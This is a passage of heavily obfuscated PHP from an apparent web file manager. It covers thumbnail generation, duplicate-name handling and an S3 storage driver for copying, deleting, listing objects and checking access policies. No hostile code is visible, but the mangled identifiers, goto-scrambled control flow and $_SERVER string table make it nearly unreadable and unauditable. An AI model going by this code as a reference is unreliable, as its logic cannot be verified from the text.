$B¡¿ÊÆŒ· ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto cß¨½µ•¡; cß¨½µ•¡: $AÛÁ¨³áè = DATA_THUMB . $a™åÂÖÎùš; del_file($AÛÁ¨³áè); if (!@file_exists($AÛÁ¨³áè)) { $AÁ®œéö† = TEMP_FILES; if (!is_dir($AÁ®œéö†)) { mk_dir($AÁ®œéö†); } $eâ•­Ëê™Œ = $AÁ®œéö† . $e­Ÿ´Ö Óâ . $EÌœª÷ª„§[94] . $eÑÍºÎ®±¤[$EÌœª÷ª„§[167]]; if (!@file_exists($eâ•­Ëê™Œ)) { $eâ•­Ëê™Œ = $this->download($f–¨î´íğÑ, $eâ•­Ëê™Œ); } ImageThumb::createThumb($eâ•­Ëê™Œ, $AÛÁ¨³áè, $B¯Šê‹ÏÒ, $B¯Šê‹ÏÒ * 10); } goto cÇšÙ¿Ç½é; aö’á±Ÿ›ƒ: IO::fileOut($a¥×ùŞ«); goto F£±œ¤èÇƒ; Eá••§’Ú: $EÌœª÷ª„§ =& $_SERVER[…ë˜õ]; if (substr($f–¨î´íğÑ, 0, 4) == $EÌœª÷ª„§[146]) { $this->fileOutLink($f–¨î´íğÑ); } $eÑÍºÎ®±¤ = $this->info($f–¨î´íğÑ); goto Dó¿Êà½æº; F£±œ¤èÇƒ: } public function fileOutImageServer($D“èåøƒÏ», $aùÙñõ¤ˆ = 250) { $this->fileOutImage($D“èåøƒÏ», $aùÙñõ¤ˆ); } public function fileNameAuto($AÀ½¢á‚—ö, $d¢ÃÆØĞ´, $D‰éÄíƒåŠ = REPEAT_RENAME, $a”›ªé–®„ = false) { goto c®ë–º¨º; dÏé¾¹ÁŠ: if ($D‰éÄíƒåŠ == REPEAT_SKIP) { return !1; } $Añêğ“ÎóŒ = $FŸŸ‹„—µ¯[94] . get_path_ext($d¢ÃÆØĞ´); $Añêğ“ÎóŒ = $Añêğ“ÎóŒ == $FŸŸ‹„—µ¯[94] || $a”›ªé–®„ ? $FŸŸ‹„—µ¯[33] : $Añêğ“ÎóŒ; goto aÇŒ„‚µ‘–; aÇŒ„‚µ‘–: $dš‘ ä½Õ¤ = 1; $f×·¨µÔàô = substr($d¢ÃÆØĞ´, 0, strlen($d¢ÃÆØĞ´) - strlen($Añêğ“ÎóŒ)); $dˆ·êŞŸ¸á = $f×·¨µÔàô . "\50{$dš‘ ä½Õ¤}\51{$Añêğ“ÎóŒ}"; goto c–©ƒ´É÷’; c®ë–º¨º: $FŸŸ‹„—µ¯ =& $_SERVER[…ë˜õ]; $bÖ»ŠÁàÇ = $AÀ½¢á‚—ö === $FŸŸ‹„—µ¯[33] ? $d¢ÃÆØĞ´ : rtrim($AÀ½¢á‚—ö, $FŸŸ‹„—µ¯[8]) . $FŸŸ‹„—µ¯[8] . $d¢ÃÆØĞ´; if ($D‰éÄíƒåŠ == REPEAT_REPLACE || !$this->exist($bÖ»ŠÁàÇ) || $a”›ªé–®„ && $D‰éÄíƒåŠ != REPEAT_RENAME_FOLDER) { return $d¢ÃÆØĞ´; } goto dÏé¾¹ÁŠ; c–©ƒ´É÷’: while ($this->exist(rtrim($AÀ½¢á‚—ö, $FŸŸ‹„—µ¯[8]) . $FŸŸ‹„—µ¯[8] . $dˆ·êŞŸ¸á)) { $dˆ·êŞŸ¸á = $f×·¨µÔàô . "\x28{$dš‘ ä½Õ¤}\51{$Añêğ“ÎóŒ}"; $dš‘ ä½Õ¤++; } return $dˆ·êŞŸ¸á; goto Eºñ°èß‡ë; Eºñ°èß‡ë: } private function fileNameAutoList($Fï¡‚„“˜–, $B’Í•–è˜Æ, $Cæ‚¥ß­öÂ = false) { goto d‹°›‹êôã; e•Õ¼‡Ë¸: $b¡Á½äÕİ½ = array_to_keyvalue($B‚ÀèÌ»æ„, $CÒßê»¼öâ[33], $CÒßê»¼öâ[28]); $EŸø†¶í†† = $CÒßê»¼öâ[94] . get_path_ext($B’Í•–è˜Æ); $EŸø†¶í†† = $EŸø†¶í†† == $CÒßê»¼öâ[94] || $Cæ‚¥ß­öÂ ? $CÒßê»¼öâ[33] : $EŸø†¶í††; goto aÔ³Ò®ÀŠ; d‹°›‹êôã: $CÒßê»¼öâ =& $_SERVER[…ë˜õ]; $B‚ÀèÌ»æ„ = $this->listPath($Fï¡‚„“˜–, !0); $B‚ÀèÌ»æ„ = array_merge($B‚ÀèÌ»æ„[$CÒßê»¼öâ[74]], $B‚ÀèÌ»æ„[$CÒßê»¼öâ[73]]); goto e•Õ¼‡Ë¸; d‘Ş¹ĞšÚ¯: return $E ™£›„¥´; goto FŞÓ¸¡›Ì¨; aÔ³Ò®ÀŠ: $aÓ…ÈèºÜ = substr($B’Í•–è˜Æ, 0, strlen($B’Í•–è˜Æ) - strlen($EŸø†¶í††)); $E ™£›„¥´ = $aÓ…ÈèºÜ . "\x28\60\51{$EŸø†¶í††}"; for ($Fó¬èÁ¼ = 1; $Fó¬èÁ¼ <= count($b¡Á½äÕİ½) + 1; $Fó¬èÁ¼++) { $E ™£›„¥´ = $aÓ…ÈèºÜ . "\50{$Fó¬èÁ¼}\x29{$EŸø†¶í††}"; if (!in_array_not_case($E ™£›„¥´, $b¡Á½äÕİ½)) { return $E ™£›„¥´; } } goto d‘Ş¹ĞšÚ¯; FŞÓ¸¡›Ì¨: } public function listAllFiles($fõ½¢Â‚…Ü, $f²Ó³÷Ø„º, $bÎÕåÍíï = array()) { goto bŠ·«²Ğ„; B—†–à·Æ: foreach (array_unique($Bßô¿´‡Ê) as $BÃµ¤×¾) { $DØ’™óŸÖ« = array($DŠñòá‚ÄŞ[75] => $this->getPathOuter($DŠñòá‚ÄŞ[8] . $fõ½¢Â‚…Ü . $DŠñòá‚ÄŞ[8] . $BÃµ¤×¾), $DŠñòá‚ÄŞ[76] => 1, $DŠñòá‚ÄŞ[77] => 0); if (substr($BÃµ¤×¾, -1) != $DŠñòá‚ÄŞ[8]) { $DØ’™óŸÖ«[$DŠñòá‚ÄŞ[76]] = 0; $BÑ±òÖÌõ‚ = $this->getPath($fõ½¢Â‚…Ü . $DŠñòá‚ÄŞ[8] . $BÃµ¤×¾); $DØ’™óŸÖ«[$DŠñòá‚ÄŞ[77]] = isset($bÎÕåÍíï[$BÑ±òÖÌõ‚]) ? $bÎÕåÍíï[$BÑ±òÖÌõ‚] : $this->size($BÑ±òÖÌõ‚); } $E§¡œ˜İ½[] = $DØ’™óŸÖ«; } return $E§¡œ˜İ½; goto eˆÔˆïˆ‘Ï; bŠ·«²Ğ„: $DŠñòá‚ÄŞ =& $_SERVER[…ë˜õ]; if (empty($f²Ó³÷Ø„º)) { return array(); } $Bßô¿´‡Ê = array(); goto C‰İÄ»à æ; C‰İÄ»à æ: $fõ½¢Â‚…Ü = trim($fõ½¢Â‚…Ü, $DŠñòá‚ÄŞ[8]); foreach ($f²Ó³÷Ø„º as $BÃµ¤×¾) { $bóßİÛ±Äº = ltrim(substr(trim($BÃµ¤×¾, $DŠñòá‚ÄŞ[8]), strlen($fõ½¢Â‚…Ü)), $DŠñòá‚ÄŞ[8]); $Bßô¿´‡Ê = array_merge($Bßô¿´‡Ê, $this->slicePath($bóßİÛ±Äº)); } $E§¡œ˜İ½ = array(); goto B—†–à·Æ; eˆÔˆïˆ‘Ï: } public function slicePath($eñ¾°Ã´Šğ) { $Eªë•‘‹†Û =& $_SERVER[…ë˜õ]; $C¿œëˆ¶Œ = explode($Eªë•‘‹†Û[8], trim($eñ¾°Ã´Šğ, $Eªë•‘‹†Û[8])); $c¦µ»±º = 0; do { ++$c¦µ»±º; $c¦ØŒé×„à[] = implode($Eªë•‘‹†Û[8], array_slice($C¿œëˆ¶Œ, 0, $c¦µ»±º)) . $Eªë•‘‹†Û[8]; } while ($c¦µ»±º < count($C¿œëˆ¶Œ)); $c¦ØŒé×„à[count($C¿œëˆ¶Œ) - 1] = $eñ¾°Ã´Šğ; return $c¦ØŒé×„à; } public function getHost() { $B¡÷Ë” ·Ğ =& $_SERVER[…ë˜õ]; $Dµõ‘¯êäÉ = parse_url(trim($this->domain, $B¡÷Ë” ·Ğ[8])); $d›Å¥¸ØŞ¤ = isset($Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[173]]) ? $Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[173]] : http_type(); $e„´²©Ğ‹ = isset($Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[174]]) ? $Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[174]] : $Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[75]]; if (isset($Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[175]])) { $e„´²©Ğ‹ .= $B¡÷Ë” ·Ğ[4] . $Dµõ‘¯êäÉ[$B¡÷Ë” ·Ğ[175]]; } return $d›Å¥¸ØŞ¤ . $B¡÷Ë” ·Ğ[176] . $e„´²©Ğ‹; } public function pathEncode($fˆ¡ö©ÉÒ) { $aĞêİÛ¹áĞ =& $_SERVER[…ë˜õ]; return str_replace($aĞêİÛ¹áĞ[177], $aĞêİÛ¹áĞ[8], rawurlencode($fˆ¡ö©ÉÒ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($BŒ©÷Ğ¸…Ù) { set_timeout(); require_once SDK_DIR . $_SERVER[…ë˜õ][178]; parent::__construct(); $this->_init($BŒ©÷Ğ¸…Ù); } public function _init($d·ó±ƒÄ˜æ) { foreach ($d·ó±ƒÄ˜æ as $c„ÛÌÈ‰ù => $a«£è÷¨°) { if (isset($this->{$c„ÛÌÈ‰ù})) { $this->{$c„ÛÌÈ‰ù} = $a«£è÷¨°; } } $this->endpoint = $d·ó±ƒÄ˜æ[$_SERVER[…ë˜õ][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($d™ñ­Í¥´ = "\166\64") { $this->signVer = $d™ñ­Í¥´; $this->client->setSignatureVersion($d™ñ­Í¥´); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto fé½×«‰†Ó; fé½×«‰†Ó: $BÜ½ÎøÊ—„ =& $_SERVER[…ë˜õ]; $AÄìåíï£³ = $this->getBucketCors(); if (!$AÄìåíï£³ || !is_array($AÄìåíï£³)) { return !1; } goto b³Õ”Üµ†Å; E¢ƒÒĞİÑß: $få²§ĞŞ©Ä = array($BÜ½ÎøÊ—„[185], $BÜ½ÎøÊ—„[186], $BÜ½ÎøÊ—„[187], $BÜ½ÎøÊ—„[188], $BÜ½ÎøÊ—„[189]); $dŒ°ÔÇ¿Ë­ = array_diff($få²§ĞŞ©Ä, $F­Á‡¡Âì¼); return empty($dŒ°ÔÇ¿Ë­); goto a†¼ÒÛÑì¨; b³Õ”Üµ†Å: if ($AÄìåíï£³[$BÜ½ÎøÊ—„[180]] != $BÜ½ÎøÊ—„[181] || $AÄìåíï£³[$BÜ½ÎøÊ—„[182]] != $BÜ½ÎøÊ—„[181]) { return !1; } $F­Á‡¡Âì¼ = array_map($BÜ½ÎøÊ—„[183], $AÄìåíï£³[$BÜ½ÎøÊ—„[184]]); if (!is_array($F­Á‡¡Âì¼)) { $F­Á‡¡Âì¼ = array(); } goto E¢ƒÒĞİÑß; a†¼ÒÛÑì¨: } public function mkfile($bè„°ÔØ, $fõ¨ÀÅº = '', $F‘¾‚Ç÷•í = REPEAT_RENAME) { $DŞç¾¥÷ÙÚ = $this->setContent($bè„°ÔØ, $fõ¨ÀÅº); if ($DŞç¾¥÷ÙÚ !== !1) { return $this->getPathOuter($bè„°ÔØ); } return !1; } public function mkdir($fÈ›–š£Çç, $f³ ©¬Éé = REPEAT_SKIP) { if (empty($fÈ›–š£Çç)) { return !1; } if ($this->_isFolder($fÈ›–š£Çç)) { return $this->getPathOuter($fÈ›–š£Çç); } $e™ñòĞœÑ„ = $this->setContent($fÈ›–š£Çç, $_SERVER[…ë˜õ][33], !0); if ($e™ñòĞœÑ„ !== !1) { return $this->getPathOuter($fÈ›–š£Çç); } return !1; } public function copyFile($A•ŸôÜ«Õ, $b‡İ¢œ…Š³, $dï˜¾¹åÙ = array()) { $EÅ„¨ŒÅ‘ =& $_SERVER[…ë˜õ]; $eäá†¡ÌÔ = $this->objectMeta($A•ŸôÜ«Õ); if (!$eäá†¡ÌÔ) { return !1; } if ($eäá†¡ÌÔ[$EÅ„¨ŒÅ‘[77]] <= 1024 * 1024 * 200) { $e’ŒÚï×À = $this->client->copyObject($this->bucket, $A•ŸôÜ«Õ, $this->bucket, $b‡İ¢œ…Š³, $EÅ„¨ŒÅ‘[190], $dï˜¾¹åÙ); } else { $e’ŒÚï×À = $this->client->multiCopyObject($this->bucket, $A•ŸôÜ«Õ, $this->bucket, $b‡İ¢œ…Š³, $dï˜¾¹åÙ); } $e’ŒÚï×À = $e’ŒÚï×À ? $this->getPathOuter($b‡İ¢œ…Š³) : !1; return $e’ŒÚï×À; } public function moveFile($D‰ÚÉ…Ãí‚, $Fö†ŠÒÓ•Ò) { if ($this->copyFile($D‰ÚÉ…Ãí‚, $Fö†ŠÒÓ•Ò)) { $this->delFile($D‰ÚÉ…Ãí‚); return $this->getPathOuter($Fö†ŠÒÓ•Ò); } return !1; } public function delFile($f…œÎ‰½) { return $this->client->deleteObject($this->bucket, $f…œÎ‰½); } public function delFolder($d½øÔñ³¯Ÿ) { goto CºÈò“ßù£; A“ÎôòŸ‚: return $this->delByBatch($b‹Ó‹Ù°ñ”[$A²¤“Š[74]]); goto B§øì×­æ²; AÕªèÏ­Ô”: if (!empty($d½øÔñ³¯Ÿ) && !in_array($DÀÅí×ÖŠ¢, $b‹Ó‹Ù°ñ”[$A²¤“Š[74]])) { $b‹Ó‹Ù°ñ”[$A²¤“Š[74]][] = $DÀÅí×ÖŠ¢; } $fã­ƒ¬ÃÆÖ = $this->delByBatch($b‹Ó‹Ù°ñ”[$A²¤“Š[73]]); if (!$fã­ƒ¬ÃÆÖ) { return !1; } goto A“ÎôòŸ‚; CºÈò“ßù£: $A²¤“Š =& $_SERVER[…ë˜õ]; if (!$this->exist($d½øÔñ³¯Ÿ)) { return !0; } $this->listItemCache = !1; goto AÃ–­ÊµĞç; AÃ–­ÊµĞç: $b‹Ó‹Ù°ñ” = $this->fileList($d½øÔñ³¯Ÿ); $this->listItemCache = !0; $DÀÅí×ÖŠ¢ = trim($d½øÔñ³¯Ÿ, $A²¤“Š[8]) . $A²¤“Š[8]; goto AÕªèÏ­Ô”; B§øì×­æ²: } private function delByBatch($e¶›™Şç) { foreach (array_chunk($e¶›™Şç, 1000) as $F™Ë’½µç°) { $B¯×ŞÊ‡ø = $this->client->deleteObjects($this->bucket, $F™Ë’½µç°); if (!$B¯×ŞÊ‡ø) { return !1; } } return !0; } public function rename($B‡‡ßï®Óˆ, $c’ËâÉ˜Ñ¹) { return $this->renameObject($B‡‡ßï®Óˆ, $c’ËâÉ˜Ñ¹); } public function listPath($FÈä„®ß¤ï, $FÒÏòãª†Í = false) { $cŠ¢ØÉˆ½Ÿ =& $_SERVER[…ë˜õ]; $B›ÒåÃİƒÍ = $this->fileList($FÈä„®ß¤ï, $cŠ¢ØÉˆ½Ÿ[8], !0); foreach ($B›ÒåÃİƒÍ[$cŠ¢ØÉˆ½Ÿ[74]] as $e¡æî…æä¯ => $BÄæç£“‡—) { $B›ÒåÃİƒÍ[$cŠ¢ØÉˆ½Ÿ[74]][$e¡æî…æä¯] = $this->folderInfo($BÄæç£“‡—, $FÒÏòãª†Í); } foreach ($B›ÒåÃİƒÍ[$cŠ¢ØÉˆ½Ÿ[73]] as $e¡æî…æä¯ => $BÄæç£“‡—) { $B›ÒåÃİƒÍ[$cŠ¢ØÉˆ½Ÿ[73]][$e¡æî…æä¯] = $this->fileInfo($BÄæç£“‡—[$cŠ¢ØÉˆ½Ÿ[28]], $FÒÏòãª†Í, $BÄæç£“‡—); } return $B›ÒåÃİƒÍ; } private function fileInfo($A™Âİµ±”‹, $DãÍğ¤—©Ü = false, $DÀ›ºÙºÁº = array()) { goto cĞ·Ò½’á‡; EŠ†¼ØôÖò: $BÜÖõ‚ùƒ[$Bõ˜ØåÔ¹›[192]] = $BÜÖõ‚ùƒ[$Bõ˜ØåÔ¹›[83]] = 0; $BÜÖõ‚ùƒ[$Bõ˜ØåÔ¹›[193]] = $BÜÖõ‚ùƒ[$Bõ˜ØåÔ¹›[194]] = !0; if (empty($DÀ›ºÙºÁº)) { $DÀ›ºÙºÁº = $this->objectMeta($A™Âİµ±”‹); if (!$DÀ›ºÙºÁº) { return $BÜÖõ‚ùƒ; } } goto D›Ä¦ÔÊÖ; cĞ·Ò½’á‡: $Bõ˜ØåÔ¹› =& $_SERVER[…ë˜õ]; $BÜÖõ‚ùƒ = array($Bõ˜ØåÔ¹›[28] => $this->pathThis($A™Âİµ±”‹), $Bõ˜ØåÔ¹›[75] => $this->getPathOuter($A™Âİµ±”‹), $Bõ˜ØåÔ¹›[29] => $Bõ˜ØåÔ¹›[191], $Bõ˜ØåÔ¹›[167] => $this->ext($A™Âİµ±”‹), $Bõ˜ØåÔ¹›[77] => isset($DÀ›ºÙºÁº[$Bõ˜ØåÔ¹›[77]]) ? $DÀ›ºÙºÁº[$Bõ˜ØåÔ¹›[77]] : 0); if ($DãÍğ¤—©Ü) { return $BÜÖõ‚ùƒ; } goto EŠ†¼ØôÖò; D›Ä¦ÔÊÖ: if (isset($DÀ›ºÙºÁº[$Bõ˜ØåÔ¹›[195]])) { $BÜÖõ‚ùƒ[$Bõ˜ØåÔ¹›[83]] = $DÀ›ºÙºÁº[$Bõ˜ØåÔ¹›[195]]; } if (isset($DÀ›ºÙºÁº[$Bõ˜ØåÔ¹›[77]])) { $BÜÖõ‚ùƒ[$Bõ˜ØåÔ¹›[77]] = $DÀ›ºÙºÁº[$Bõ˜ØåÔ¹›[77]]; } return $BÜÖõ‚ùƒ; goto f‡†ÆŒ¥é©; f‡†ÆŒ¥é©: } private function folderInfo($cãè×ÂÔ‚, $A¬¦«¤·£Û = false) { goto e‚œÑæˆ‚‹; D†™èØÉŒ: $cá¹·ÄÖß[$A÷Ä‡Ôˆ·»[192]] = $cá¹·ÄÖß[$A÷Ä‡Ôˆ·»[83]] = 0; $cá¹·ÄÖß[$A÷Ä‡Ôˆ·»[193]] = $cá¹·ÄÖß[$A÷Ä‡Ôˆ·»[194]] = !0; if ($cãè×ÂÔ‚ == $A÷Ä‡Ôˆ·»[33]) { return $cá¹·ÄÖß; } goto aÅ•ˆâæİ; e‚œÑæˆ‚‹: $A÷Ä‡Ôˆ·» =& $_SERVER[…ë˜õ]; $cá¹·ÄÖß = array($A÷Ä‡Ôˆ·»[28] => $this->pathThis($cãè×ÂÔ‚), $A÷Ä‡Ôˆ·»[75] => $this->getPathOuter($A÷Ä‡Ôˆ·»[8] . $cãè×ÂÔ‚), $A÷Ä‡Ôˆ·»[29] => $A÷Ä‡Ôˆ·»[76]); if ($A¬¦«¤·£Û) { return $cá¹·ÄÖß; } goto D†™èØÉŒ; aÅ•ˆâæİ: $cãè×ÂÔ‚ = trim($cãè×ÂÔ‚, $A÷Ä‡Ôˆ·»[8]) . $A÷Ä‡Ôˆ·»[8]; $BÅæ„Ğ¥ŒÊ = $this->objectMeta($cãè×ÂÔ‚); if (isset($BÅæ„Ğ¥ŒÊ[$A÷Ä‡Ôˆ·»[195]])) { $cá¹·ÄÖß[$A÷Ä‡Ôˆ·»[192]] = $BÅæ„Ğ¥ŒÊ[$A÷Ä‡Ôˆ·»[195]]; } goto CÆ¯…Å„Å­; CÆ¯…Å„Å­: return $cá¹·ÄÖß; goto bî˜÷éò–Ñ; bî˜÷éò–Ñ: } private function fileList($BßÊŠóĞ«˜, $eÖá¼öİª = '', $dßØ…çËÚ = 0) { goto fâ‹ƒÜ•; fâ‹ƒÜ•: $cóŠ‚¦«¹á =& $_SERVER[…ë˜õ]; $dØ»ŒÅ÷Êä = rtrim($BßÊŠóĞ«˜, $cóŠ‚¦«¹á[8]) . $cóŠ‚¦«¹á[8]; $cº¿»’İ¦Î = $this->listObjs($dØ»ŒÅ÷Êä, null, null, $eÖá¼öİª); goto aÔê¥›ğ¹; cÊÆğæ´±î: foreach ($cº¿»’İ¦Î[$cóŠ‚¦«¹á[196]] as $Få²ÀøÖ™é) { goto AĞ•ÜîÙÂœ; añ°‹ÀÊœÙ: $bÁ‰òŞáö = $f¨ÅÑ‚ÉªÎ == 0 && substr($föåÚ™ÊÉ…, strlen($föåÚ™ÊÉ…) - 1, 1) == $cóŠ‚¦«¹á[8] ? !0 : !1; if ($Bá·Û±š”) { $this->cacheMethod($cóŠ‚¦«¹á[197], $föåÚ™ÊÉ…, $bÁ‰òŞáö); $this->cacheMethod($cóŠ‚¦«¹á[198], $föåÚ™ÊÉ…, $Få²ÀøÖ™é); } if ($bÁ‰òŞáö) { $f±É“Ş“Ä[] = $föåÚ™ÊÉ…; continue; } goto B²„˜îà; B²„˜îà: $a‚òÉ……¡µ[] = $dßØ…çËÚ ? $Få²ÀøÖ™é : $föåÚ™ÊÉ…; goto a¢ÉÅ©ø÷Ğ; AĞ•ÜîÙÂœ: $föåÚ™ÊÉ… = $Få²ÀøÖ™é[$cóŠ‚¦«¹á[28]]; if ($föåÚ™ÊÉ… == $dØ»ŒÅ÷Êä) { continue; } $f¨ÅÑ‚ÉªÎ = isset($Få²ÀøÖ™é[$cóŠ‚¦«¹á[77]]) ? $Få²ÀøÖ™é[$cóŠ‚¦«¹á[77]] : 0; goto añ°‹ÀÊœÙ; a¢ÉÅ©ø÷Ğ: } foreach ($cº¿»’İ¦Î[$cóŠ‚¦«¹á[199]] as $Få²ÀøÖ™é) { $f±É“Ş“Ä[] = $Få²ÀøÖ™é[$cóŠ‚¦«¹á[28]]; if ($Bá·Û±š”) { $this->cacheMethod($cóŠ‚¦«¹á[197], $Få²ÀøÖ™é[$cóŠ‚¦«¹á[28]], !0); } } if ($Bá·Û±š”) { $this->cacheMethod($cóŠ‚¦«¹á[197], $BßÊŠóĞ«˜, !0); } goto FæèÑÁô‡ô; FæèÑÁô‡ô: return array($cóŠ‚¦«¹á[74] => $f±É“Ş“Ä, $cóŠ‚¦«¹á[73] => $a‚òÉ……¡µ); goto eŠÃóö®Ø; aÔê¥›ğ¹: if (!$cº¿»’İ¦Î) { return array($cóŠ‚¦«¹á[74] => array(), $cóŠ‚¦«¹á[73] => array()); } $Bá·Û±š” = $this->listItemCache === !1 ? !1 : !0; $f±É“Ş“Ä = $a‚òÉ……¡µ = array(); goto cÊÆğæ´±î; eŠÃóö®Ø: } private function listObjs($A÷—´‘ãÌª, $eæ›íáéë = null, $Fëö‚‚ ÚË = null, $d·â®Üè©‡ = null) { $EÃÈ¬áÊ±Ü =& $_SERVER[…ë˜õ]; $A÷—´‘ãÌª = trim($A÷—´‘ãÌª, $EÃÈ¬áÊ±Ü[8]); $AŒ·Ñ˜®òš = empty($A÷—´‘ãÌª) ? $EÃÈ¬áÊ±Ü[33] : $A÷—´‘ãÌª . $EÃÈ¬áÊ±Ü[8]; return $this->client->getBucket($this->bucket, $AŒ·Ñ˜®òš, $eæ›íáéë, $Fëö‚‚ ÚË, $d·â®Üè©‡, !0); } public function has($EáŸ„Œ×Êè, $a“Æ°İ”„õ = false, $E‘öÈ¼šá = true) { goto D‰†‘¯¹êá; DêËºŠÓ¦Ñ: $bİİÜÌÀ¶  = $e¾Õ©¿ªŞ = array(); while (!0) { $f‡¨©ÕÖ¡¼ = $this->listObjs($EáŸ„Œ×Êè, $Cæ –ñì¸¬, $A›¸ø¤´¸Ô, $còÎš§ä); if (!$f‡¨©ÕÖ¡¼) { break; } $Cæ –ñì¸¬ = $f‡¨©ÕÖ¡¼[$A—­Óï¬©˜[200]]; $cÓÇƒù‚Ê = $f‡¨©ÕÖ¡¼[$A—­Óï¬©˜[196]]; $d’å¾©±î— = $f‡¨©ÕÖ¡¼[$A—­Óï¬©˜[199]]; if (empty($cÓÇƒù‚Ê) && empty($d’å¾©±î—)) { break; } if (count($cÓÇƒù‚Ê) == 1 && $cÓÇƒù‚Ê[0][$A—­Óï¬©˜[28]] == $eé½¶£ƒ¯Ÿ) { break; } if ($a“Æ°İ”„õ) { if (count($cÓÇƒù‚Ê)) { $cÓÇƒù‚Ê = array_column($cÓÇƒù‚Ê, $A—­Óï¬©˜[28]); $bİİÜÌÀ¶  = array_merge($bİİÜÌÀ¶ , $cÓÇƒù‚Ê); } if (count($d’å¾©±î—)) { $d’å¾©±î— = array_column($d’å¾©±î—, $A—­Óï¬©˜[28]); $e¾Õ©¿ªŞ = array_merge($e¾Õ©¿ªŞ, $d’å¾©±î—); } if ($Cæ –ñì¸¬ === null) { break; } continue; } if ($E‘öÈ¼šá) { if (!empty($cÓÇƒù‚Ê)) { if (count($cÓÇƒù‚Ê) > 1 || isset($cÓÇƒù‚Ê[0][$A—­Óï¬©˜[28]]) && $cÓÇƒù‚Ê[0][$A—­Óï¬©˜[28]] != $eé½¶£ƒ¯Ÿ) { return !0; } } } else { if (!empty($d’å¾©±î—)) { return !0; } } if ($Cæ –ñì¸¬ === null) { break; } } if ($a“Æ°İ”„õ) { $bİİÜÌÀ¶  = array_diff($bİİÜÌÀ¶ , array($eé½¶£ƒ¯Ÿ)); $bİİÜÌÀ¶  = count(array_unique($bİİÜÌÀ¶ )); $e¾Õ©¿ªŞ = count(array_unique($e¾Õ©¿ªŞ)); return array($A—­Óï¬©˜[201] => $bİİÜÌÀ¶ , $A—­Óï¬©˜[202] => $e¾Õ©¿ªŞ); } goto B £Ö„¨à; D‰†‘¯¹êá: $A—­Óï¬©˜ =& $_SERVER[…ë˜õ]; $EáŸ„Œ×Êè = trim($EáŸ„Œ×Êè, $A—­Óï¬©˜[8]); $eé½¶£ƒ¯Ÿ = empty($EáŸ„Œ×Êè) ? $A—­Óï¬©˜[33] : $EáŸ„Œ×Êè . $A—­Óï¬©˜[8]; goto a¦¦Í…¿¯Ú; B £Ö„¨à: return !1; goto CÓÜ¹ˆ; a¦¦Í…¿¯Ú: $Cæ –ñì¸¬ = null; $A›¸ø¤´¸Ô = 500; $còÎš§ä = $A—­Óï¬©˜[8]; goto DêËºŠÓ¦Ñ; CÓÜ¹ˆ: } public function listAll($B—…‹é‰Š») { $D²­»Üß–‹ =& $_SERVER[…ë˜õ]; $f®¤ÅñÛ = $this->fileList($B—…‹é‰Š», $D²­»Üß–‹[33], !0); $aÚåÄÖø—² = array(); foreach ($f®¤ÅñÛ[$D²­»Üß–‹[73]] as $e¿ÔÃâìßî) { $aÚåÄÖø—²[$e¿ÔÃâìßî[$D²­»Üß–‹[28]]] = $e¿ÔÃâìßî[$D²­»Üß–‹[77]]; } foreach ($f®¤ÅñÛ[$D²­»Üß–‹[74]] as $e¿ÔÃâìßî) { if (is_string($e¿ÔÃâìßî)) { $aÚåÄÖø—²[$e¿ÔÃâìßî] = 0; } } return $this->listAllFiles($B—…‹é‰Š», array_keys($aÚåÄÖø—²), $aÚåÄÖø—²); } public function canRead($eËŒ÷Ê¢£Æ) { $c£ØÉˆè‡¿ =& $_SERVER[…ë˜õ]; $D²¹í¥Ôñ’ = $this->client->getAccessControlPolicy($this->bucket, $eËŒ÷Ê¢£Æ); if (!$D²¹í¥Ôñ’) { return !1; } return in_array($D²¹í¥Ôñ’, array($c£ØÉˆè‡¿[203], $c£ØÉˆè‡¿[204], $c£ØÉˆè‡¿[205])) ? !0 : !1; } public function canWrite($cƒ—ô‚ÒßÅ) { $D˜¡Ô¹ è¯ =& $_SERVER[…ë˜õ]; $Eê…ëğÂï = $this->client->getAccessControlPolicy($this->bucket, $cƒ—ô‚ÒßÅ); if (!$Eê…ëğÂï) { return !1; } return in_array($Eê…ëğÂï, array($D˜¡Ô¹ è¯[203], $D˜¡Ô¹ è¯[204])) ? !0 : !1; } public function getContent($B½Ï©©ºâ) { return $this->client->getObject($this->bucket, $B½Ï©©ºâ); } public function setContent($Eª†¹ÍŞ«Š, $eÉÄ°ÌùÑ¹ = '', $Eß¦˜ö–õê = false) { goto fØÓŞÇ…œ; CùÑ˜„´ÊÒ: $this->cacheMethod(null, null); $C±±Ù–ğÁâ = $this->copyFile($Eª†¹ÍŞ«Š, $Eª†¹ÍŞ«Š, array($d†ŒØö¬íÓ[206] => $C±±Ù–ğÁâ[$d†ŒØö¬íÓ[207]])); return $C±±Ù–ğÁâ ? !0 : !1; goto F´’ÓÍêŒì; fØÓŞÇ…œ: $d†ŒØö¬íÓ =& $_SERVER[…ë˜õ]; $Eª†¹ÍŞ«Š = $Eß¦˜ö–õê ? trim($Eª†¹ÍŞ«Š, $d†ŒØö¬íÓ[8]) . $d†ŒØö¬íÓ[8] : $Eª†¹ÍŞ«Š; $c¹”Ô˜Š¢õ = get_file_mime(get_path_ext($Eª†¹ÍŞ«Š)); goto c¸¨ñï¿¡ò; c¸¨ñï¿¡ò: $C±±Ù–ğÁâ = $this->client->putObject($eÉÄ°ÌùÑ¹, $this->bucket, $Eª†¹ÍŞ«Š, $d†ŒØö¬íÓ[190], array(), $c¹”Ô˜Š¢õ); if (!$C±±Ù–ğÁâ) { return !1; } if ($Eß¦˜ö–õê) { return !0; } goto CùÑ˜„´ÊÒ; F´’ÓÍêŒì: } public function fileSubstr($CŒµØºÀ, $c’­ƒËç‰, $C²Æ°àÀèŠ) { $C¤„Ş»£†® = $c’­ƒËç‰ + 